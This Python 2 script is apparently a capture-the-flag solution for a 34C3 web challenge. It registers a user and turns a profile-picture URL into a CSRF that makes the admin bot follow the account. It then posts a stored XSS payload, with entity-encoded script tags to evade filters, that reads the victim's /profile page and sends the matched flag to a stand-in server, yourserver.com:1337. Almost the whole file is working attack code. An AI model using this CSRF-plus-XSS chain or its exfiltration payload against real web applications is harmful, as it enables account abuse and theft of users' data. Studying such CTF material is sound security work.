#!/usr/bin/env python2

import base64
import random
import requests
import sys
import time

s = requests.Session()
if len(sys.argv) == 2:
    url = 'http://{}'.format(sys.argv[1])
else:
    url = 'http://127.0.0.1:31337/'
s.get(url)
token = s.cookies['csrftoken']

def register():
    user = 'foo{}'.format(random.randint(1000, 9999))
    pw = 'foobarbaz'
    print('Registering user {}'.format(user))

    s.post(url + '/signup', data=dict(
        username=user,
        password1=pw,
        password2=pw,
        csrfmiddlewaretoken=token))

def profile(profile_pic):
    s.post(url + '/profile', data=dict(
        description='',
        profile_pic=profile_pic,
        csrfmiddlewaretoken=token))

def send_msg(to, msg):
    s.post(url + '/messages/new/{}'.format(to), data=dict(
        message=msg,
        csrfmiddlewaretoken=token))

def quak(what):
    s.post(url + '/feed', data=dict(
        story=what,
        csrfmiddlewaretoken=token))

register()
token = s.cookies['csrftoken']
print('csrftoken {}'.format(token))
feed = '/feed/' + s.get(url + '/feed').content.split('/feed/')[1].split('"')[0]
admin_token = s.get(url + '/messages').content.split('/feed/')[1].split('"')[0]
print('Our feed: {}'.format(feed))
print('Admin token: {}'.format(admin_token))
profile(feed + '/follow?foo.png') # change profile pic url
send_msg(admin_token, 'foobar') # send msg to admin

while 'admin' not in s.get(url + '/followers').content:
    time.sleep(1)
    print('Waiting for xss bot to follow us....')
print('ok admin follows us!')

time.sleep(.5)

quak('<iframe srcdoc="{}"></iframe>'.format('''
    <&#x73;cript>
        var xhr = new XMLHttpRequest(); 
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                var xhr2 = new XMLHttpRequest(); 
                
                xhr2.open('GET', 'http://yourserver.com:1337/?'+encodeURI(xhr.responseText.match('(34C3_[^ ]+)')), true); 
                xhr2.send(null);
            }
        }
        
        xhr.open('GET', '/profile', true); 
        xhr.send(null);
    </&#x73;cript>
    '''.replace("=", "&#x3d;")))

print('done.')



def logout():
    s.get(url + 'logout')

